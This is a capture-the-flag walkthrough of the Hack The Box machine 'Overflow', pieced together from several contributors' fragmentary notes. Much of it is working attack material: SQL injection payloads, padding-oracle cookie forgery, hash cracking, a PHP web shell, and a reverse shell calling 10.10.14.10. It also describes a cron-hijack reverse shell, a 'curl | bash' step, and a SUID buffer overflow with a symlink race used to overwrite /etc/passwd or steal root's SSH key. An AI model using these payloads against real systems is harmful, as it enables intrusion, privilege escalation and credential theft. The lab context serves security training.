> Author: **[Xclow3n][author-profile]**

## Discovery

### Port Scanning

TCP:

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 eb:7c:15:8f:f2:cc:d4:26:54:c1:e1:57:0d:d5:b6:7c (RSA)
|   256 d9:5d:22:85:03:de:ad:a0:df:b0:c3:00:aa:87:e8:9c (ECDSA)
|_  256 fa:ec:32:f9:47:17:60:7e:e0:ba:b6:d1:77:fb:07:7b (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: overflow, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Overflow Sec
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: Host:  overflow; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

UDP:

```
All 1000 scanned ports on overflow.htb (10.10.11.119) are in ignored states.
```

### Enumeration

Directories:

```bash
gobuster dir -u http://10.10.11.119/ -w /usr/share/wordlists/discovery/raft-medium-directories.txt -o discovery/directories.txt --cookies 'auth=c%2FyPUOLI4eC988OUyd2bd3p8RAPPCvYS'
# /config               (Status: 301) [Size: 313] [--> http://10.10.11.119/config/]
# /assets               (Status: 301) [Size: 313] [--> http://10.10.11.119/assets/]
# /home                 (Status: 301) [Size: 311] [--> http://10.10.11.119/home/]
# /server-status        (Status: 403) [Size: 277]
gobuster dir -u http://10.10.11.119/home/ -w /usr/share/wordlists/discovery/raft-medium-directories.txt -o discovery/directories.home.txt --cookies 'auth=c%2FyPUOLI4eC988OUyd2bd3p8RAPPCvYS'
# /profile              (Status: 301) [Size: 319] [--> http://10.10.11.119/home/profile/]
```

Files:

```bash
gobuster dir -u http://10.10.11.119/ -w /usr/share/wordlists/discovery/raft-medium-files.txt -o discovery/files.txt -x php --cookies 'auth=c%2FyPUOLI4eC988OUyd2bd3p8RAPPCvYS'
# /register.php         (Status: 200) [Size: 2060]
# /index.php            (Status: 200) [Size: 12227]
# /login.php            (Status: 200) [Size: 1878]
# /logout.php           (Status: 302) [Size: 0] [--> index.php]
# /wp-forum.phps        (Status: 403) [Size: 277]
# /dispatch.fcgi        (Status: 403) [Size: 277]
# /mytias.fcgi          (Status: 403) [Size: 277]
# /test.fcgi            (Status: 403) [Size: 277]
gobuster dir -u http://10.10.11.119/home/ -w /usr/share/wordlists/discovery/raft-medium-files.txt -o discovery/files.home.txt --cookies 'auth=c%2FyPUOLI4eC988OUyd2bd3p8RAPPCvYS'
# /index.php            (Status: 302) [Size: 12503] [--> ../login.php]
# /blog.php             (Status: 200) [Size: 2971]
# /wp-forum.phps        (Status: 403) [Size: 277]
# /dispatch.fcgi        (Status: 403) [Size: 277]
# /mytias.fcgi          (Status: 403) [Size: 277]
# /test.fcgi            (Status: 403) [Size: 277]
ffuf -c -u http://10.10.11.119/config/FUZZ -w /usr/share/wordlists/discovery/raft-medium-files.txt -o discovery/files.config.txt -b 'auth=c%2FyPUOLI4eC988OUyd2bd3p8RAPPCvYS'
# auth.php                [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 119ms]
# db.php                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 121ms]
# users.php               [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 115ms]
```

### Web Browsing

Can create an account:

![][user-profile]

The blog talks about several attacks:

![][blog-posts]

### Testing for SQLi

Injection fails on the login page:

```bash
sqlmap -v 2 -u http://10.10.11.119/login.php \
    --dbms mysql --answer="redirect=N" --data "username=admin&password=admin" \
    --level 5 --risk 3 --time-sec 2 --batch --proxy=http://127.0.0.1:8080
```

## Admin on the Web Console

Let's try out the attacks listed on the blog; first the SQL truncation:

```bash
padbuster http://overflow.htb/login.php \
    $'Digvrbacih8Avya5Chq81UWsTdtkIcBn6Xj5OwSbvGnOR6PnSlF8szzRhchPVSmpiH24ti67Q8QufWLBokvW+Q==' 8 \
    -cookie $'auth=Digvrbacih8Avya5Chq81UWsTdtkIcBn6Xj5OwSbvGnOR6PnSlF8szzRhchPVSmpiH24ti67Q8QufWLBokvW+Q==' \
    -plaintext 'username=admin'
# Block 2 Results:
# [+] New Cipher Text (HEX): 770c1a4ebac96c3f
# [+] Intermediate Bytes (HEX): 4a6d7e23d3a76e3d

# Block 1 Results:
# [+] New Cipher Text (HEX): 039e1a5a3596aa3f
# [+] Intermediate Bytes (HEX): 76ed7f285bf7c75a

# [+] Encrypted value is: A54aWjWWqj93DBpOuslsPwAAAAAAAAAA
```

This cookie gives admin access to the web console. A new item appears in the
menu, pointing to `http://10.10.11.119/admin_cms_panel/admin/login.php`:

![][admin-panel]

## Editor on CMS MS

There's `http://overflow.htb/home/logs.php?name=admin`:

```js
async function getUsers() {
let url = 'http://overflow.htb/home/logs.php?name=admin';
try {
let res = await fetch(url);
return await res.text();
} catch (error) {
console.log(error);
}
}

async function renderUsers() {
let users = await getUsers();
let html = '';
let container = document.querySelector('.content');
container.innerHTML = users;
}
```

It looks like a weak script:

```bash
sqlmap -v 2 -u 'http://overflow.htb/home/logs.php?name=admin' \
    --cookie=$'auth=A54aWjWWqj93DBpOuslsPwAAAAAAAAAA; CMSSESSIDf25decdf38ae=rcli3spa091baa9gtfjpgfkpd0' \
    --dbms mysql --answer="redirect=N" -p "name" \
    --level 5 --risk 3 --time-sec 2 --batch --proxy=http://localhost:8080/
# sqlmap resumed the following injection point(s) from stored session:
# ---
# Parameter: name (GET)
#     Type: boolean-based blind
#     Title: AND boolean-based blind - WHERE or HAVING clause
#     Payload: name=admin') AND 9963=9963-- GNWJ
#     Vector: AND [INFERENCE]

#     Type: time-based blind
#     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
#     Payload: name=admin') AND (SELECT 8088 FROM (SELECT(SLEEP(2)))Vnlq)-- ogDW
#     Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

#     Type: UNION query
#     Title: Generic UNION query (NULL) - 3 columns
#     Payload: name=admin') UNION ALL SELECT NULL,NULL,CONCAT(0x716a717a71,0x78717052774f4e5757444b67554d7977636e6c4d476b7a6155744662626b51646250446e53726b68,0x716b6b6271)-- -
#     Vector:  UNION ALL SELECT NULL,NULL,[QUERY]-- -
```

The last query can be used to retrieve meta information and then the content
of the DB:

```bash
declare -a payloads=(
    $'version()+--+-'
    $'database()+--+-'
    $'group_concat(table_name)+from+information_schema.tables+where+table_schema+%3d+database()+--+-'
    $'group_concat(column_name)+from+information_schema.columns+where+table_schema+%3d+database()+and+table_name+%3d\'userlog\'+--+-'
    $'group_concat(USERNAME)+from+userlog+--+-')
for p in "${payloads[@]}"; do
    curl -i -s -k -X $'GET' \
        -H $'Host: overflow.htb' \
        -b $'auth=A54aWjWWqj93DBpOuslsPwAAAAAAAAAA; CMSSESSIDf25decdf38ae=rcli3spa091baa9gtfjpgfkpd0' \
        -x $'http://127.0.0.1:8080'
        $'http://overflow.htb/home/logs.php?name=admin\')+UNION+ALL+SELECT+NULL,NULL,'"${p}"
done
```

```
5.7.35-0ubuntu0.18.04.2
developer@localhost
logs
userlog
id,USERNAME,Lastlogin
admin,editor,Mark,Diana,Tester,super,frost,Corp,admin,admin,admin,admin
```

Let's try and exploit the SQLi to write on the disk:

```
admin')+UNION+ALL+SELECT+NULL,NULL,"<%3fphp+system($_REQUEST[chr(99)])%3b+%3f>"+INTO+OUTFILE+"../uploads/shell.php"%3b--+-
```

Fails... Looking for more:

```bash
ffuf -c -u 'http://10.10.11.119/admin_cms_panel/admin/FUZZ' \
    -w '/usr/share/wordlists/discovery/raft-medium-words.txt' \
    -b $'auth=A54aWjWWqj93DBpOuslsPwAAAAAAAAAA; CMSSESSIDf25decdf38ae=rcli3spa091baa9gtfjpgfkpd0' \
    -o 'discovery/directories.admin_cms_panel.admin.txt'
# tmp                     [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 145ms]
# admin                   [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 162ms]
# modules                 [Status: 301, Size: 330, Words: 20, Lines: 10, Duration: 291ms]
# lib                     [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 123ms]
# uploads                 [Status: 301, Size: 330, Words: 20, Lines: 10, Duration: 130ms]
# assets                  [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 143ms]
# doc                     [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 124ms]
```

There are a few new folders that may have write permissions. But MySQL seems to
prevent writing to a file...

```bash
declare -a payloads=(
    $'group_concat(table_name)+from+information_schema.tables+where+table_schema+%3d+\'cmsmsdb\'+--+-'
    $'group_concat(table_name)+from+information_schema.tables+where+table_schema+%3d+\'Overflow\'+--+-'
    $'group_concat(table_name)+from+information_schema.tables+where+table_schema+%3d+\'develop\'+--+-')
for p in "${payloads[@]}"; do
    curl -i -s -k -X $'GET' \
        -H $'Host: overflow.htb' \
        -b $'auth=A54aWjWWqj93DBpOuslsPwAAAAAAAAAA; CMSSESSIDf25decdf38ae=rcli3spa091baa9gtfjpgfkpd0' \
        -x $'http://127.0.0.1:8080'
        $'http://overflow.htb/home/logs.php?name=admin\')+UNION+ALL+SELECT+NULL,NULL,'"${p}"
done
```

```
cms_additional_users,cms_additional_users_seq,cms_admin_bookmarks,cms_admin_bookmarks_seq,cms_adminlog,cms_content,cms_content_props,cms_content_props_seq,cms_content_seq,cms_event_handler_seq,cms_event_handlers,cms_events,cms_events_seq,cms_group_perms,cms_group_perms_seq,cms_groups,cms_groups_seq,cms_layout_design_cssassoc,cms_layout_des
users
```

Digging deeper in the DB:

```
e3d748d58b58657bfa4dffe2def0b1c7:6c2d17f37e226486
```

```bash
hashcat -O -w 3 -a 0 -m 20 hash.editor /usr/share/wordlists/passwords/rockyou.txt
```

> e3d748d58b58657bfa4dffe2def0b1c7:6c2d17f37e226486:alpha!@#$%bravo

Finally... This works for the user `editor` on the CMS MS console.

## CMS Console to System User

The console runs CMS MS version `2.2.8`:

![][cmsms-version]

### Trying Unauthenticated CVEs

The unauthenticated CVEs somehow fail here:

- [CVE-2019-9053][cve-2019-9053]
- [CVE-2019-9060][cve-2019-9060]

The CVE `9060` has no available POC. `9053` is a blind SQL injection, it can be
tested manually with:

```bash
curl -i -s -k -X $'GET' \
    -H $'Host: 10.10.11.119' \
    -b $'auth=A54aWjWWqj93DBpOuslsPwAAAAAAAAAA; CMSSESSIDf25decdf38ae=rcli3spa091baa9gtfjpgfkpd0' \
    $'http://10.10.11.119/admin_cms_panel/moduleinterface.php?mact=News,m1_,default,0&m1_idlist=a,b,1,5))+and+(select+sleep(2)+from+cms_siteprefs+where+sitepref_value+like+0x6125+and+sitepref_name+like+0x736974656d61736b)+--+-'
```

The above command tries a single character and should have a delay of around
2s on success.

The available POC should iterate and give username / salt /etc:

```bash
python2.7 -i www/cve-2019-9053.py -u http://10.10.11.119/admin_cms_panel --crack -w /usr/share/wordlists/passwords/rockyou-50.txt
# [+] Salt for password found: qRe$0
# [+] Username found: 6LebYklgmw938.q173e14sukhkSB24ph9h
# [+] Email found: Fvi
# [+] Password found: F33ir
```

But it just returns BS.

### Object Injection RCE

There's yet another exploit for version `2.2.8`, from [Rapid7][cmsms-exploit]. It is
integrated into Metasploit as a module:

```bash
use exploit/multi/http/cmsms_object_injection_rce
set rhosts 10.10.11.119
set targeturi admin_cms_panel/
set username editor
set password alpha!@#$%bravo
```

### User Defined Tags

```php
<?php if(isset($_REQUEST[chr(99)]))system($_GET[chr(99)]); ?>
$sock=fsockopen("10.10.14.10",9999);exec("/bin/sh -i <&3 >&3 2>&3");
```

### Enumeration

```bash
ffuf -c -u 'http://10.10.11.119/admin_cms_panel/admin/FUZZ' \
    -w '/usr/share/wordlists/discovery/raft-medium-words.txt' \
    -b $'b302911aed6517744ab012cf13b55692d6d547f3=8a29964a011a22b311488aca3a644cd1bf181a05%3A%3AeyJ1aWQiOjMsInVzZXJuYW1lIjoiZWRpdG9yICIsImVmZl91aWQiOm51bGwsImVmZl91c2VybmFtZSI6bnVsbCwiaGFzaCI6IiQyeSQxMCQwb2VXcGlkUzE0OGsuM2hTWXc1WlMuQ2wxQnE1cllsNEtDdGM3MXp5M0tOUUZKMlRPN0E3aSJ9; __c=80325170653ded02996; auth=A54aWjWWqj93DBpOuslsPwAAAAAAAAAA; CMSSESSIDf25decdf38ae=rcli3spa091baa9gtfjpgfkpd0'
```

Enumerate CMS admin panel.  U will find a subdomain.

i used metasploit: exploit/multi/http/cmsms_object_injection_rce

## www-data to developer

In `/var/www/html/config/db.php`:

```php
#define('DB_Server', 'localhost');
#define('DB_Username', 'root');
#define('DB_Password','root');
#define('DB_Name', 'Overflow');

$lnk = mysqli_connect("localhost","developer", "sh@tim@n","Overflow");
$db = mysqli_select_db($lnk,"Overflow");

if($db == false){
    dir('Cannot Connect to Database');
}
```

```bash
mysql -D'Overflow' -u'developer' -p'sh@tim@n' -e'select * from users;'
# +----------+----------------------------------+
# | username | password                         |
# +----------+----------------------------------+
# | admin    | c71d60439ed5590b3c5e99d95ed48165 |
# +----------+----------------------------------+
```

`/var/www//devbuild-job/config/db.php`:

```php
$lnk = mysqli_connect("localhost","dev_manager", "3RyxKah_hBf*V6ja","develop");
```

## developer to tester

Check whats going on with pspy

- Create task.sh on ur attacking machine that when ran it creates a reverse connection to u
- spin ur python web server on port 80
- set ur attacking IP to resolve taskmanage.overf*** on overflow's host file
- start netcat listener and wait a minute for tester to connect 😀

## Escalation

```bash
cat /opt/commontask.sh
# bash < <(curl -s http://taskmanage.overflow.htb/task.sh)
ls -lah /opt/file_encrypt/
# total 24K
# drwxr-x---+ 2 root root 4.0K Sep 17 21:56 .
# drwxr-xr-x  3 root root 4.0K Sep 17 21:56 ..
# -rwsr-xr-x  1 root root  12K May 31 08:41 file_encrypt
# -rw-r--r--  1 root root  399 May 30 14:59 README.md
cat /opt/file_encrypt/README.md
# Our couple of reports have been leaked to avoid this. We have created a tool to encrypt your reports. Please check the pin feature of this application and report any issue that you get as this application is still in development. We have modified the tool a little bit that you can only use the pin feature now. The encrypt function is there but you can't use it now.The PIN should be in your inbox
crontab -l -u tester
# # m h  dom mon dow   command
# * * * * * bash /opt/commontask.sh
```

i have the `file_encrypt`, not sure where im getting the PIN from or is this a disassemble/RE kinda thing with a buffer overflow (hence the name)???

there is a function in the program called random which generates the pin, if you break at it and step until the end you can read registers and grab the pin from eax

random+57 its almost the end of random function

the pin -202976456 is valid and after that there is an scanf that triggers a buffer overflow after 44 characters

```
offset of 44
eip 35624134

payload = PIN + NOP*(OFFSET - len(SHELL_CODE)) + SHELL_CODE + EIP
dumping payload to file

./file_enc < payload
```

executing code on stack is disabled. try another method.

Once you have the script, host it in a web server, e.g. python3 -m http.server 80, and then run the following command in tester's shell:

curl -s http://10.10.x.x/exploit.sh | bash

Copy /etc/passwd to /tmp/passwd
In /tmp/passwd add new user with root priv (eg: rot) use openssl -1 to create password . Encrypt /tmp/passwd using xor 0x9b.
Run the file_encrypt
Input : /tmp/passwd
Encrypted file : /etc/passwd
https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/

```python
import ctypes

memory = 0x6b8b4567
def random(memory):
    xor = memory
    for i in range(10):
        xor = xor * 0x59 + 0x14
    return xor ^ memory

invite = ctypes.c_int(random(memory)).value

print(invite)
```

code to overflow the name to encryption function

```python
python3 -c 'import pwn;print(b"A"*44 + pwn.p64(0x5655585b))'
```

program for encrypt the passwd

```python
import os

password=b"./passwd"

plaintext  = open(password, 'rb').read()
ciphertext = open(password, 'wb')

for b in plaintext:
    ciphertext.write(bytes([b ^ 0x9b]))
```

```
The last step to privilege to root: (shell role is tester)
1.cp /etc/passwd /tmp/passwd
2.Generate the password for new user, such as leaker.
openssl passwd -1 -salt leaker pass123
The result is :    $1$leaker$.FSMJ3CZ0hJfjQS2/XWew.
3.Add the new user to /tmp/passwd
echo "leaker:$1$leaker$.FSMJ3CZ0hJfjQS2/XWew.:0:0:root:/root:/bin/bash" >> /tmp/passwd
4.Encrypt the passwd contained new user.
cp /home/developer/encryptpasswd.py /tmp/
python3 encryptpasswd.py
So we encrypted /tmp/passwd successfully.
5.Get the PIN code.
python3 createpin.py
PIN: -202976456
6.Overflow the name to encryption function.
python3 -c 'import pwn;print(b"A"*44 + pwn.p64(0x5655585b))'
Python printed the result: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV\x00\x00\x00\x00
7.Run the ELF tool file_encrypt.
The interactive information is as follows:
./file_encrypt
-202976456
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV\x00\x00\x00\x00
/tmp/passwd
/etc/passwd
And wait for several seconds the process completed when the error occured.
bash: [10583: 4 (255)] tcsetattr: Inappropriate ioctl for device

The new user was not added to /etc/passwd finally.
```

```
Try it manual with AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV\x5b\x58\x55\x56

I wonder why you do all that steps. The file_encrypt program has a "sleep(3)" for a reason:

touch /tmp/aa && ln -s /root/.ssh/id_rsa /tmp/bb

run the program with the overflow to call encrypt function and enter input /tmp/aa and output /tmp/bb
then you have 3 seconds to run this in another console:

mv /tmp/bb /tmp/aa && touch /tmp/bb

With this you have bypassed the root owner check on the file and you have the id_rsa key on /tmp/bb, you just need to xor again, run the program and put input /tmp/bb and output /tmp/cc and the unencrypted root id_rsa will be there.

If you go through the editing of /etc/passwd you dont need to add a password at all to the file, just add this at the end of the file:

hacked::0:0:root:/root:/bin/bash

once you have this on /etc/passwd you just do su - hacked and u will have a shell with uid 0 and no password.
```

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV\x5b\x58\x55\x56 is the most import.
We need overflow the name to the entrance of the encrypt function:
gdb file_encrypt
starti
break *encrypt
We can see the address of the encrypt function is 0x5655585b, and put the bytes as the Little-endian mode.

You must run the program on the path /opt/file_encrypt/file_encrypt, just because this ELF file has the SUID and it works as root.
We can read the id_rsa of root, or even replace the /etc/passwd file. Both solutions ok, just select one as you like.

If you want to get the replacement of /etc/passwd using your own file, you must not put an empty hash to the new user.
Generate the password as below but not using the salt:
openssl passwd -1 pass123
You will get the random hash like this: $1$cTbjm0zE$RbrZimZvyDvkxP2rycuKi1
Add the hash to the new user pwn,  and put them the passwd file:
echo 'pwn:$1$cTbjm0zE$RbrZimZvyDvkxP2rycuKi1:0:0:root:/root:/bin/bash' >> passwd

Finally, get the root:
su pwn
pass123
```

## TODO

https://www.rapid7.com/db/modules/exploit/unix/fileformat/exiftool_djvu_ant_perl_injection/

Create ur exploit using unix/fileformat/exiftool_djvu_ant_perl_injection in metasploit, upload the generated .jpg file and start ur netcat listener

[author-profile]: https://app.hackthebox.com/users/172213

[blog-posts]: images/screenshots/blog-posts.png
[cmsms-version]: images/screenshots/cmsms-version.png
[cmsms-exploit]: https://www.rapid7.com/db/modules/exploit/multi/http/cmsms_object_injection_rce/
[cve-2019-9053]: https://www.exploit-db.com/exploits/46635
[cve-2019-9060]: https://nvd.nist.gov/vuln/detail/CVE-2019-9060
[user-profile]: images/screenshots/profile.png
